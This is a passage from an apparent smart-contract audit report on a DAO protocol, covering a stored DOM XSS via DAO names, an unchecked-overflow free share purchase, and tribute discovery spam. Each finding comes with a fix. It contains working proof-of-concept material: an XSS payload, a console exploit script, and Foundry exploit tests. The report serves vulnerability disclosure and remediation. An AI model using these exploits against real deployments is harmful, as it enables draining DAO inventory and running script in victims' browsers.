The attacker deploys or controls a DAO and sets its organization name to an HTML payload that does not require JSON metacharacters, such as `<img src=x onerror=alert(document.domain)>`. Because `Renderer.daoContractURI()` reuses the raw DAO name inside `Display.jsonImage()` without JSON escaping, the emitted `contractURI` remains syntactically valid JSON while preserving the active HTML payload in the `name` field.

When a victim later browses that DAO in the official dapp, `Majeur.html` decodes the base64 contract metadata and parses it as JSON. If the victim opens the DAO contract/NFT modal, `openNFTModal()` writes `metadata.name` directly into `modalBody.innerHTML`, so the browser interprets the attacker's `name` as markup and executes the event handler on the dapp origin.

##### Prerequisites
- **Attacker Control/Position:** Control over a DAO's `orgName` metadata value
- **Required Access/Placement:** Unauthenticated protocol user who can summon a DAO, or a controller/governance majority of an existing DAO
- **User Interaction:** Required — the victim must view the malicious DAO in the dapp and trigger the contract metadata modal (for example by clicking the DAO emblem/contract card)
- **Privileges/Configuration Required:** The DAO must use the renderer-derived `contractURI` path (for example, empty `orgURI` with a configured renderer) or another consumer must directly use `Renderer.daoContractURI()` output
- **Knowledge Required:** The attacker needs to know or share a link to the malicious DAO page on the public dapp
- **Attack Complexity:** Low — a payload using only HTML characters such as `<` and `>` keeps the JSON valid and does not require escaping tricks

##### Attack Steps
1. Call `Summoner.summon()` with a malicious `orgName`, or later update the DAO name via `setMetadata()`.
2. Ensure the DAO relies on renderer-generated contract metadata rather than a custom `orgURI`.
3. Lure a victim to open the DAO in the official `dapp/Majeur.html` interface.
4. Have the victim trigger the DAO contract metadata modal.
5. The dapp decodes `contractURI`, parses the JSON, and writes `metadata.name` into `innerHTML`, executing the attacker's payload.

##### Impact Breakdown
- **Confirmed Impact:** DOM XSS in the official dapp origin when a victim opens renderer-derived DAO contract metadata containing a malicious name.
- **Potential Follow-On Impact:** The injected script can spoof UI, manipulate visible transaction details, or abuse browser-accessible state on the dapp origin; actual wallet-drain impact would still depend on follow-on social engineering and wallet confirmation behavior.
- **Confidentiality:** Low — injected JavaScript can read data exposed to page scripts, including DOM state and any non-secret local storage values.
- **Integrity:** Low — the attacker can rewrite UI elements and misrepresent on-page actions or metadata.
- **Availability:** Low — payloads can break modal rendering or repeatedly disrupt dapp interaction in the victim session.

#### Recommended Fix

Fix the producer-side bug by JSON-escaping dynamic strings before concatenating them in `Display.jsonImage()`, and fix the consumer-side bug by rendering metadata text with DOM text APIs instead of `innerHTML` interpolation.

**Before (Solidity):**
```solidity
function jsonImage(string memory name_, string memory description_, string memory svg_)
    internal
    pure
    returns (string memory)
{
    return jsonDataURI(
        string.concat(
            '{"name":"',
            name_,
            '","description":"',
            description_,
            '","image":"',
            svgDataURI(svg_),
            '"}'
        )
    );
}
```

**After (Solidity):**
```solidity
function jsonEscape(string memory s) internal pure returns (string memory) {
    bytes memory in_ = bytes(s);
    bytes memory out = new bytes(in_.length * 2 + 16); // simple upper bound
    uint256 j;
    for (uint256 i; i < in_.length; ++i) {
        bytes1 c = in_[i];
        if (c == '"' || c == '\\') {
            out[j++] = '\\';
            out[j++] = c;
        } else if (c == bytes1(uint8(0x0A))) {
            out[j++] = '\\';
            out[j++] = 'n';
        } else if (c == bytes1(uint8(0x0D))) {
            out[j++] = '\\';
            out[j++] = 'r';
        } else if (c == bytes1(uint8(0x09))) {
            out[j++] = '\\';
            out[j++] = 't';
        } else {
            out[j++] = c;
        }
    }
    assembly { mstore(out, j) }
    return string(out);
}

function jsonImage(string memory name_, string memory description_, string memory svg_)
    internal
    pure
    returns (string memory)
{
    return jsonDataURI(
        string.concat(
            '{"name":"',
            jsonEscape(name_),
            '","description":"',
            jsonEscape(description_),
            '","image":"',
            jsonEscape(svgDataURI(svg_)),
            '"}'
        )
    );
}
```

**Before (JavaScript):**
```javascript
modalBody.innerHTML = `
  ${imageHTML}
  <div class="nft-modal-title">${metadata.name || title}</div>
  ${metadata.description ? `<div class="nft-modal-description">${metadata.description}</div>` : ''}
`;
```

**After (JavaScript):**
```javascript
modalBody.innerHTML = imageHTML;

const titleEl = document.createElement('div');
titleEl.className = 'nft-modal-title';
titleEl.textContent = metadata.name || title;
modalBody.appendChild(titleEl);

if (metadata.description) {
  const descEl = document.createElement('div');
  descEl.className = 'nft-modal-description';
  descEl.textContent = metadata.description;
  modalBody.appendChild(descEl);
}
```

##### Security Principle
Metadata is untrusted input even when it originates from on-chain state. Correct output encoding must match the destination context: JSON escaping for JSON serialization, and text-only DOM APIs or HTML escaping for browser rendering.

##### Defense in Depth
- Reject or normalize control characters in DAO names at summon/update time so malformed metadata cannot be emitted even if another consumer forgets to escape.
- Audit all dapp paths that render on-chain metadata and replace string-built `innerHTML` with `textContent` / `createElement` for names, descriptions, and attributes.
- Add regression tests covering both renderer-generated metadata and custom `orgURI` metadata so the dapp does not trust either source.

##### Verification Guidance
- Add a regression test where `orgName` is `<img src=x onerror=alert(1)>` and confirm the emitted `contractURI` remains valid JSON while the dapp displays the literal text rather than executing HTML.
- Add a regression test where `orgName` contains `"` and `\\` and confirm metadata parsing still succeeds for renderer-generated URIs.
- Validate that normal DAO names, proposal receipts, and permit cards continue rendering correctly after the escaping changes.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
python3 --version
```
- **Target Setup:**
```bash
python3 -m http.server 8000 -d dapp
```

##### Runnable PoC
The full end-to-end exploit only requires a renderer-shaped `contractURI` value and the real `openNFTModal()` sink from `dapp/Majeur.html`; deploying a full DAO locally is unnecessary to prove exploitability because the bug is in metadata serialization plus DOM insertion. After opening `http://127.0.0.1:8000/Majeur.html`, paste the following in the browser console:

```javascript
const contractURI = 'data:application/json;base64,' + btoa(
  '{"name":"<img src=x onerror=alert(document.domain)> DUNA Covenant",' +
  '"description":"Wyoming Decentralized Unincorporated Nonprofit Association operating charter and member agreement",' +
  '"image":"data:image/svg+xml;base64,PHN2Zy8+"}'
);

const json = atob(contractURI.slice(29));
const metadata = JSON.parse(json);
openNFTModal(metadata, 'DAO Contract');
```

##### Steps
1. **Serve the shipped dapp locally**
```bash
python3 -m http.server 8000 -d dapp
```
- Expected: `Serving HTTP on ... 8000` appears.
2. **Open the official dapp page**
- Navigate to `http://127.0.0.1:8000/Majeur.html`.
- Expected: the Majeur dapp loads in the browser.
3. **Execute the console PoC above**
- Expected: the NFT/contract modal opens and the injected `<img>` tag is rendered inside the modal title area.
4. **Observe JavaScript execution**
- Expected: `alert(document.domain)` fires from the injected `onerror` handler.

##### Verification
Confirm that the alert is triggered by the modal render path, not by console evaluation itself: after dismissing the alert, inspect the modal and verify that the title area contains an injected `<img>` node rather than plain text. This matches the shipped sink in `openNFTModal()` using `innerHTML` with `metadata.name`.

##### Outcome
The attacker gains the ability to execute arbitrary JavaScript in the victim's browser under the dapp origin whenever the victim opens renderer-derived DAO metadata containing a malicious name and triggers the metadata modal. From there, the attacker can tamper with UI state, mislead the victim about transaction intent, and interfere with dapp usage within the browser session.

</details>

---

<details>
<summary><strong>20. Share sale unchecked pricing math allows free or underpriced asset purchases</strong></summary>

> **Review: Valid novel finding targeting ShareSale peripheral. Medium severity accepted for peripheral scope.** Unchecked multiplication overflow in `ShareSale` pricing is a genuine design gap not present in prior audits. Not a Moloch.sol core finding — targets `ShareSale.sol`. The governance configuration dependency (DAO sets the price parameters) applies the privileged-role rule, but the overflow itself should be guarded. **V2 hardening:** add checked arithmetic or validate pricing parameters at configuration time to prevent overflow combinations.

**Winfunc ID:** `17`

**CVSS Score:** `5.9`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N`

**Vulnerability Type:** `CWE-190: Integer Overflow or Wraparound`

**Source Location:** `src/peripheral/ShareSale.sol:61:buy()`

**Sink Location:** `src/peripheral/ShareSale.sol:86:buy()`

#### Summary

An attacker can exploit unchecked pricing math in the share-sale module to acquire allowance-backed shares, loot, or treasury tokens for less than the configured price, including for zero payment.

#### Root Cause

`ShareSale.buy()` computes `cost = amount * s.price / 1e18` inside an `unchecked` block, so Solidity 0.8 overflow checks are disabled and the multiplication wraps modulo `2^256` before division. The wrapped `cost` is used for ETH/ERC20 payment collection, but the function later calls `IMoloch(dao).spendAllowance(s.token, amount)` and forwards the full `amount` to the buyer, with no invariant tying the charged payment to the released asset quantity.

#### Impact

###### Confirmed Impact
A public caller can underpay, or pay zero, and still receive the full allowance-backed amount whenever the configured `price` and chosen `amount` overflow in the unchecked multiplication. This directly drains the module's sale inventory, which may be DAO shares, loot, or arbitrary treasury ERC20s.

###### Potential Follow-On Impact
If the sold asset is voting shares, loot, or another economically significant DAO asset, the discounted acquisition can be leveraged for governance influence, treasury extraction, or sale exhaustion. Those downstream effects depend on the deployed DAO's sale parameters, token selection, ragequit settings, and broader governance configuration.

#### Source-to-Sink Trace

1. **[src/peripheral/ShareSale.sol:54](../src/peripheral/ShareSale.sol#L54)**

   ```solidity
   sales[msg.sender] = Sale(token, payToken, deadline, price);
   ```

   The DAO stores an unbounded sale price and token configuration. Only `price == 0` is rejected, so overflow-prone prices remain valid module configuration.

2. **[src/peripheral/ShareSale.sol:61](../src/peripheral/ShareSale.sol#L61)**

   ```solidity
   function buy(address dao, uint256 amount) public payable {
   ```

   Untrusted input enters from any public caller, who fully controls `amount` and whether/how much ETH to send.

3. **[src/peripheral/ShareSale.sol:63](../src/peripheral/ShareSale.sol#L63)**

   ```solidity
   Sale memory s = sales[dao];
   ```

   The buyer-controlled `amount` is combined with the DAO-configured `price`, `payToken`, and `token` for this sale.

4. **[src/peripheral/ShareSale.sol:69](../src/peripheral/ShareSale.sol#L69)**

   ```solidity
   cost = amount * s.price / 1e18;
   ```

   Unchecked multiplication wraps modulo `2^256` before division, so `cost` can become far smaller than the intended price or even zero.

5. **[src/peripheral/ShareSale.sol:74](../src/peripheral/ShareSale.sol#L74)**

   ```solidity
   if (msg.value < cost) revert InsufficientPayment();
   ```

   In the ETH path, the contract enforces only the wrapped `cost`. If overflow drives `cost` to zero, `msg.value == 0` passes.

6. **[src/peripheral/ShareSale.sol:86](../src/peripheral/ShareSale.sol#L86)**

   ```solidity
   IMoloch(dao).spendAllowance(s.token, amount);
   ```

   Despite charging only the wrapped `cost`, ShareSale asks the DAO to release the full requested `amount` from its allowance.

7. **[src/Moloch.sol:686](../src/Moloch.sol#L686)**

   ```solidity
   allowance[token][msg.sender] -= amount;
   ```

   Moloch's allowance enforcement caps only the quantity withdrawn. It does not verify that the charged payment matched the configured price.

8. **[src/Moloch.sol:687](../src/Moloch.sol#L687)**

   ```solidity
   _payout(token, msg.sender, amount);
   ```

   Moloch transfers or mints the full `amount` to ShareSale after decrementing allowance.

9. **[src/peripheral/ShareSale.sol:97](../src/peripheral/ShareSale.sol#L97)**

   ```solidity
   safeTransfer(tokenAddr, msg.sender, amount);
   ```

   ShareSale forwards the full released asset amount to the attacker, completing the underpriced purchase.

#### Exploit Analysis

##### Attack Narrative
The attacker is a public buyer monitoring DAO sale configurations exposed through `ShareSale.sales(dao)`. When they identify a sale where the configured `price` and an attainable `amount` make `amount * price` overflow inside `ShareSale.buy()`, they choose an amount that causes the wrapped `cost` to become zero or another artificially small value.

In the ETH payment path, the attacker can then call `buy()` with `msg.value == 0` if the wrapped `cost` is zero. The contract accepts that payment, but later spends the DAO's allowance for the full requested `amount` and forwards the released shares, loot, or ERC20s to the attacker. In the ERC20 payment path, the same undercharge occurs so long as the configured pay token accepts the wrapped-cost `transferFrom` (standard tokens typically accept a zero-amount transfer).

##### Prerequisites
- **Attacker Control/Position:** The attacker can call the public `ShareSale.buy(dao, amount)` entrypoint and choose `amount` and `msg.value`
- **Required Access/Placement:** Unauthenticated public user / arbitrary EOA or contract
- **User Interaction:** None
- **Privileges/Configuration Required:** A DAO must have configured `ShareSale` with a `price` and available allowance/cap combination that overflows in `amount * price`; for example, `price = 2^255` with `amount >= 2`, or more ordinary prices paired with a sufficiently large allowance. The ETH pay-token path (`payToken == address(0)`) makes zero-cost exploitation especially straightforward.
- **Knowledge Required:** The attacker must know the sale configuration (`token`, `payToken`, `price`, and practical allowance/cap)
- **Attack Complexity:** High — exploitation requires a vulnerable DAO sale configuration outside the attacker's control, although the arithmetic and transaction execution are straightforward once such a configuration exists

##### Attack Steps
1. Read `sales[dao]` and identify a sale with a price/cap combination that makes unchecked multiplication overflow.
2. Compute an `amount` such that `(amount * price) mod 2^256 < 1e18`; e.g. if `price = 2^255`, use `amount = 2`.
3. Call `ShareSale.buy(dao, amount)` with zero ETH in the ETH-pay path, or only the wrapped `cost` in the ERC20/small-cost case.
4. Let `ShareSale` collect the wrapped `cost`, then invoke `IMoloch(dao).spendAllowance(s.token, amount)`.
5. Receive the full `amount` when `ShareSale` forwards the released asset to the buyer.
6. Repeat until the configured allowance/cap is exhausted, if the sale parameters still permit another overflowing purchase.

##### Impact Breakdown
- **Confirmed Impact:** Public buyers can obtain the full allowance-backed sale amount while paying less than the configured price, potentially including zero payment.
- **Potential Follow-On Impact:** If the sold asset is voting shares, loot, or another treasury asset with downstream rights, the attacker may leverage the discounted acquisition for governance influence, ragequit-based value extraction, or sale exhaustion; these depend on the specific DAO deployment.
- **Confidentiality:** None — the flaw does not expose protected data.
- **Integrity:** High — the attacker can improperly alter ownership of DAO-controlled sale inventory and governance balances.
- **Availability:** None — the flaw does not directly stop protocol operation, though it can exhaust sale inventory as a secondary effect.

#### Recommended Fix

Remove the `unchecked` pricing multiplication and make the payment computation revert on overflow before any payment collection or allowance spending occurs. Solidity 0.8 already provides checked arithmetic, so the simplest fix is to perform the multiplication in checked context.

Before:
```solidity
uint256 cost;
unchecked {
    cost = amount * s.price / 1e18;
}
```

After:
```solidity
uint256 cost = amount * s.price / 1e18;
```

If extremely large `amount` and `price` values must be supported without intermediate overflow, use a full-precision `mulDiv` helper that reverts on invalid inputs instead of wrapping:
```solidity
uint256 cost = Math.mulDiv(amount, s.price, 1e18);
```

##### Security Principle
Pricing logic must preserve the invariant that the quantity released from the DAO is derived from a payment computation that cannot silently wrap. Failing closed on arithmetic overflow prevents attackers from decoupling what they pay from what they receive.

##### Defense in Depth
- Add upper-bound validation for sale `price` in `configure()` and in wrapper deployment helpers such as `SafeSummoner`, so obviously nonsensical values cannot be installed.
- Add regression tests covering extreme `amount`/`price` combinations, including `price = 2^255`, large normal prices, and large allowance values.
- Consider mirroring the core `Moloch.buyShares()` pattern, which performs pricing multiplication in checked arithmetic, to keep sale implementations consistent.

##### Verification Guidance
- Add a regression test asserting that `buy()` reverts when `amount * price` would overflow, including the concrete case `price = 2^255` and `amount = 2`.
- Add a regression test proving that normal purchases still succeed and charge the expected `cost` for ordinary values such as `amount = 10e18` and `price = 0.01e18`.
- Add an invariant test ensuring that the amount released via `spendAllowance` can never exceed the amount implied by the successfully charged payment.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:** Foundry (`curl -L https://foundry.paradigm.xyz | bash && foundryup`)
- **Target Setup:** from the repository root, run `forge build`

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {ShareSale} from "../src/peripheral/ShareSale.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockMoloch {
    mapping(address => mapping(address => uint256)) public allowance;
    MockERC20 public immutable payoutToken;

    constructor(MockERC20 _payoutToken) {
        payoutToken = _payoutToken;
    }

    receive() external payable {}

    function setAllowance(address spender, address token, uint256 amount) external {
        allowance[token][spender] = amount;
    }

    function spendAllowance(address token, uint256 amount) external {
        allowance[token][msg.sender] -= amount;
        payoutToken.transfer(msg.sender, amount);
    }

    function shares() external view returns (address) {
        return address(payoutToken);
    }

    function loot() external view returns (address) {
        return address(payoutToken);
    }
}

contract ShareSaleOverflowPoCTest is Test {
    function test_FreePurchaseViaOverflow() public {
        ShareSale sale = new ShareSale();
        MockERC20 payout = new MockERC20();
        MockMoloch dao = new MockMoloch(payout);

        // Small cap, but a huge even price that makes 2 * price wrap to zero.
        uint256 amount = 2;
        uint256 price = 1 << 255;

        payout.mint(address(dao), amount);
        dao.setAllowance(address(sale), address(payout), amount);

        // ShareSale stores sale config under msg.sender, so configure as the DAO.
        vm.prank(address(dao));
        sale.configure(address(payout), address(0), price, 0);

        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        sale.buy(address(dao), amount);

        // cost = (2 * 2^255 mod 2^256) / 1e18 = 0
        assertEq(address(dao).balance, 0, "dao should not receive ETH");
        assertEq(payout.balanceOf(attacker), amount, "attacker receives full asset amount");
        assertEq(payout.balanceOf(address(dao)), 0, "dao inventory drained");
    }
}
```

##### Steps
1. **Save the PoC as a Foundry test**
```bash
cat > test/ShareSaleOverflowPoC.t.sol <<'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {ShareSale} from "../src/peripheral/ShareSale.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockMoloch {
    mapping(address => mapping(address => uint256)) public allowance;
    MockERC20 public immutable payoutToken;

    constructor(MockERC20 _payoutToken) {
        payoutToken = _payoutToken;
    }

    receive() external payable {}

    function setAllowance(address spender, address token, uint256 amount) external {
        allowance[token][spender] = amount;
    }

    function spendAllowance(address token, uint256 amount) external {
        allowance[token][msg.sender] -= amount;
        payoutToken.transfer(msg.sender, amount);
    }

    function shares() external view returns (address) {
        return address(payoutToken);
    }

    function loot() external view returns (address) {
        return address(payoutToken);
    }
}

contract ShareSaleOverflowPoCTest is Test {
    function test_FreePurchaseViaOverflow() public {
        ShareSale sale = new ShareSale();
        MockERC20 payout = new MockERC20();
        MockMoloch dao = new MockMoloch(payout);

        uint256 amount = 2;
        uint256 price = 1 << 255;

        payout.mint(address(dao), amount);
        dao.setAllowance(address(sale), address(payout), amount);

        vm.prank(address(dao));
        sale.configure(address(payout), address(0), price, 0);

        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        sale.buy(address(dao), amount);

        assertEq(address(dao).balance, 0);
        assertEq(payout.balanceOf(attacker), amount);
        assertEq(payout.balanceOf(address(dao)), 0);
    }
}
EOF
```
- Expected: the test file is written successfully
2. **Run the exploit test**
```bash
forge test --match-test test_FreePurchaseViaOverflow -vv
```
- Expected: the test passes
3. **Inspect the arithmetic condition**
- Expected: the comments and assertions show `2 * 2^255` wraps to `0`, so `ShareSale.buy()` accepts `msg.value == 0` while still releasing the full `amount`

##### Verification
Confirm that the attacker ends with the full token amount, the DAO receives no ETH, and the DAO's sale inventory is reduced to zero. That demonstrates the payment amount and released asset quantity have become decoupled.

##### Outcome
The attacker obtains the full allowance-backed sale inventory selected in the call while paying zero ETH in this PoC. On a real deployment, the same logic lets a public buyer acquire shares, loot, or arbitrary ERC20 sale inventory for less than the configured price whenever `amount * price` overflows inside the unchecked pricing calculation.

</details>

---

<details>
<summary><strong>21. DAO tribute discovery spam duplicates a live offer and makes discovery views scale with history</strong></summary>

> **Review: Valid novel finding targeting Tribute peripheral. Medium severity accepted for peripheral scope.** The stale-reference duplicate-listing bug in Tribute discovery is distinct from prior Tribute findings (KF#20 bait-and-switch, Certora I-02 unbounded arrays). Not a Moloch.sol core finding — targets `Tribute.sol` discovery mechanism. Same root cause as #23. **V2 hardening:** deduplicate discovery arrays on cancel/re-propose or use a mapping-based discovery index.

**Winfunc ID:** `3`

**CVSS Score:** `5.4`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L`

**Vulnerability Type:** `CWE-834: Excessive Iteration`

**Source Location:** `src/peripheral/Tribute.sol:101:proposeTribute()`

**Sink Location:** `src/peripheral/Tribute.sol:206:getActiveDaoTributes()`

#### Summary

An attacker can repeatedly recycle a tribute entry in the Tribute peripheral, leading to duplicated active offers and degraded availability of DAO tribute listings.

#### Root Cause

`proposeTribute()` appends a new `DaoTributeRef` and `ProposerTributeRef` on every proposal, but `cancelTribute()` and `claimTribute()` only delete the live `tributes[proposer][dao][tribTkn]` mapping entry and never remove or invalidate the historical refs. Because the live offer mapping is keyed only by `(proposer, dao, tribTkn)`, re-proposing the same key after cancellation causes every historical ref for that key to resolve to the same current mapping slot, and `getActiveDaoTributes()` then counts and returns each stale ref as if it were a distinct active tribute while scanning the full append-only history twice.

#### Impact

###### Confirmed Impact
A single live tribute can be made to appear many times in `getActiveDaoTributes()`, and the work of the view grows with total historical spam rather than current active offers. The public dapp directly consumes this function to render tribute cards, so DAO users can be shown duplicated offers and the listing can become slow or fail under provider gas/time limits.

###### Potential Follow-On Impact
Depending on RPC limits, frontend timeout budgets, and how aggressively a target DAO is spammed, tribute discovery may become partially or fully unavailable until users switch to event/indexer-based tooling. This does not directly bypass DAO authorization or steal funds, but it can materially interfere with proposal sponsorship workflows that rely on the discovery surface.

#### Source-to-Sink Trace

1. **[src/peripheral/Tribute.sol:69](../src/peripheral/Tribute.sol#L69)**

   ```solidity
   function proposeTribute(address dao, address tribTkn, uint256 tribAmt, address forTkn, uint256 forAmt) public payable nonReentrant {
   ```

   Any public caller can create tributes for an arbitrary non-zero DAO address and choose the `(dao, tribTkn)` pair they will later recycle.

2. **[src/peripheral/Tribute.sol:92](../src/peripheral/Tribute.sol#L92)**

   ```solidity
   TributeOffer storage offer = tributes[msg.sender][dao][tribTkn];
   ```

   The canonical live offer is keyed only by `(proposer, dao, tribTkn)`, so re-proposing after cancellation reuses the same storage slot instead of creating a new offer identity.

3. **[src/peripheral/Tribute.sol:101](../src/peripheral/Tribute.sol#L101)**

   ```solidity
   daoTributeRefs[dao].push(DaoTributeRef({proposer: msg.sender, tribTkn: tribTkn}));
   ```

   Every proposal appends a historical DAO discovery reference with no deduplication, nonce, or active-index bookkeeping.

4. **[src/peripheral/Tribute.sol:113](../src/peripheral/Tribute.sol#L113)**

   ```solidity
   delete tributes[msg.sender][dao][tribTkn];
   ```

   Cancellation removes only the live mapping entry; the historical `daoTributeRefs` entry remains in storage.

5. **[src/peripheral/Tribute.sol:207](../src/peripheral/Tribute.sol#L207)**

   ```solidity
   TributeOffer storage offer = tributes[refs[i].proposer][dao][refs[i].tribTkn];
   ```

   During discovery, each historical ref is resolved back through the current live mapping slot for that same key.

6. **[src/peripheral/Tribute.sol:208](../src/peripheral/Tribute.sol#L208)**

   ```solidity
   if (offer.tribAmt != 0) { ++count; }
   ```

   Any stale historical ref becomes 'active' again as soon as the current mapping slot for the same key is non-zero, so duplicates inflate the counted result size.

7. **[src/peripheral/Tribute.sol:221](../src/peripheral/Tribute.sol#L221)**

   ```solidity
   result[idx] = ActiveTributeView({ proposer: r.proposer, tribTkn: r.tribTkn, tribAmt: offer.tribAmt, forTkn: offer.forTkn, forAmt: offer.forAmt });
   ```

   The function materializes one output element per historical ref, returning the same live tribute multiple times and doing work proportional to the full spammed history.

8. **[dapp/Majeur.html:15090](../dapp/Majeur.html#L15090)**

   ```solidity
   currentDaoTributes = await tributeContract.getActiveDaoTributes(currentDAO.dao.dao);
   ```

   The public frontend consumes the returned array directly for tribute discovery, so duplicated on-chain results are surfaced to DAO users.

#### Exploit Analysis

##### Attack Narrative
The attacker is any public EOA or contract that knows a target DAO address. They create a tribute with a minimal deposit, cancel it to recover the deposit, and then repeat the same cycle against the same `(proposer, dao, tribTkn)` key. Each cycle appends another discovery reference, but cancellation only clears the live mapping entry, so the historical references remain in storage.

After enough cycles, the attacker leaves one final tribute active. When the DAO's frontend or another integrator calls `getActiveDaoTributes()`, the function scans the full historical array twice and treats every historical reference whose current mapping slot is non-zero as a distinct active tribute. The result is a duplicated listing and a view whose cost depends on spam history, not on the number of real live offers.

##### Prerequisites
- **Attacker Control/Position:** Control of any EOA or contract able to call the public Tribute peripheral
- **Required Access/Placement:** Unauthenticated / public chain access
- **User Interaction:** Required — a DAO member, operator, or integrator must query the tribute list (for example by loading the public dapp)
- **Privileges/Configuration Required:** No special privileges; only the target DAO address is needed
- **Knowledge Required:** Knowledge of the target DAO address and the ability to submit ordinary transactions
- **Attack Complexity:** Low — the sequence is deterministic and can be repeated with 1 wei ETH or attacker-controlled low-value tokens, while cancellation refunds the tribute deposit

##### Attack Steps
1. Pick a target DAO address.
2. Call `proposeTribute()` with a minimal tribute (for example `1 wei`) and any valid `forAmt > 0`.
3. Call `cancelTribute()` so the live mapping entry is deleted but the historical discovery refs remain.
4. Repeat steps 2-3 many times using the same `(msg.sender, dao, tribTkn)` key.
5. Leave the final tribute active instead of canceling it.
6. Wait for a victim frontend or integrator to call `getActiveDaoTributes(dao)`.
7. Observe that the same live tribute is returned once per historical ref and that the view cost scales with total spam history.

##### Impact Breakdown
- **Confirmed Impact:** Duplicate active tribute listings and linear-cost degradation of the DAO tribute discovery view used by the public dapp
- **Potential Follow-On Impact:** RPC timeouts, broken listing pages, or operators switching to out-of-band indexing, depending on provider limits and spam volume
- **Confidentiality:** None — the bug does not expose restricted data
- **Integrity:** Low — the public discovery surface can be made to misrepresent one live offer as many offers
- **Availability:** Low — repeated spam can make discovery calls increasingly expensive and eventually unreliable for typical frontend/RPC environments

#### Recommended Fix

Replace the append-only historical discovery arrays with active-set bookkeeping that supports deletion, or at minimum move discovery history off-chain and make on-chain getters paginate over an active list. The important property is that each active offer must have a single active reference that is removed on `cancelTribute()` and `claimTribute()`.

Before:
```solidity
daoTributeRefs[dao].push(DaoTributeRef({proposer: msg.sender, tribTkn: tribTkn}));
proposerTributeRefs[msg.sender].push(ProposerTributeRef({dao: dao, tribTkn: tribTkn}));

...

delete tributes[msg.sender][dao][tribTkn];
```

After:
```solidity
mapping(address dao => DaoTributeRef[]) internal activeDaoTributes;
mapping(address proposer => mapping(address dao => mapping(address tribTkn => uint256)))
    internal activeDaoIndexPlusOne;

function _addDaoRef(address proposer, address dao, address tribTkn) internal {
    if (activeDaoIndexPlusOne[proposer][dao][tribTkn] != 0) revert InvalidParams();
    activeDaoTributes[dao].push(DaoTributeRef({proposer: proposer, tribTkn: tribTkn}));
    activeDaoIndexPlusOne[proposer][dao][tribTkn] = activeDaoTributes[dao].length;
}

function _removeDaoRef(address proposer, address dao, address tribTkn) internal {
    uint256 idxPlusOne = activeDaoIndexPlusOne[proposer][dao][tribTkn];
    if (idxPlusOne == 0) return;

    uint256 idx = idxPlusOne - 1;
    uint256 last = activeDaoTributes[dao].length - 1;

    if (idx != last) {
        DaoTributeRef memory moved = activeDaoTributes[dao][last];
        activeDaoTributes[dao][idx] = moved;
        activeDaoIndexPlusOne[moved.proposer][dao][moved.tribTkn] = idx + 1;
    }

    activeDaoTributes[dao].pop();
    delete activeDaoIndexPlusOne[proposer][dao][tribTkn];
}
```

Then call `_addDaoRef()` from `proposeTribute()` and `_removeDaoRef()` from both `cancelTribute()` and `claimTribute()`. If historical discovery is still desired, keep it in events or expose a separate paginated history view rather than scanning unbounded append-only arrays for active state.

##### Security Principle
Security-sensitive discovery surfaces should derive from canonical active state, not from append-only historical aliases that can be reactivated implicitly. Bounding iteration and maintaining a one-to-one mapping between live objects and discovery references prevents both integrity drift and resource-exhaustion abuse.

##### Defense in Depth
- Add paginated getters such as `getActiveDaoTributes(address dao, uint256 start, uint256 limit)` even after fixing the active-set bookkeeping
- Emit and document event-based indexing as the preferred way for frontends to build historical discovery lists instead of relying on unbounded on-chain scans

##### Verification Guidance
- Add a regression test that propose/cancel/re-propose cycles on the same `(proposer, dao, tribTkn)` key still return exactly one active tribute
- Add a regression test that `cancelTribute()` and `claimTribute()` remove the active discovery ref and that subsequent queries do not include the canceled/claimed offer
- Add a stress test showing that view cost depends on active entries or bounded page size, not total historical churn

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
cd "$(git rev-parse --show-toplevel)"
forge build
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {Tribute} from "src/peripheral/Tribute.sol";

contract TributeDiscoverySpamPoC is Test {
    Tribute tribute;
    address dao = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        tribute = new Tribute();
        vm.deal(attacker, 1 ether);
    }

    function test_duplicateDiscoverySpam() public {
        vm.startPrank(attacker);
        for (uint256 i; i < 5; ++i) {
            tribute.proposeTribute{value: 1 wei}(dao, address(0), 0, address(0), 1);
            if (i != 4) tribute.cancelTribute(dao, address(0));
        }
        vm.stopPrank();

        Tribute.ActiveTributeView[] memory active = tribute.getActiveDaoTributes(dao);

        // Only one live offer mapping slot exists.
        (uint256 tribAmt,,) = tribute.tributes(attacker, dao, address(0));
        assertEq(tribAmt, 1 wei);

        // But the discovery view returns that one live offer 5 times.
        assertEq(active.length, 5);
        for (uint256 i; i < active.length; ++i) {
            assertEq(active[i].proposer, attacker);
            assertEq(active[i].tribTkn, address(0));
            assertEq(active[i].tribAmt, 1 wei);
            assertEq(active[i].forTkn, address(0));
            assertEq(active[i].forAmt, 1);
        }
    }
}
```

##### Steps
1. **Save the PoC as a Foundry test**
```bash
cat > test/TributeDiscoverySpamPoC.t.sol <<'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {Tribute} from "src/peripheral/Tribute.sol";

contract TributeDiscoverySpamPoC is Test {
    Tribute tribute;
    address dao = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        tribute = new Tribute();
        vm.deal(attacker, 1 ether);
    }

    function test_duplicateDiscoverySpam() public {
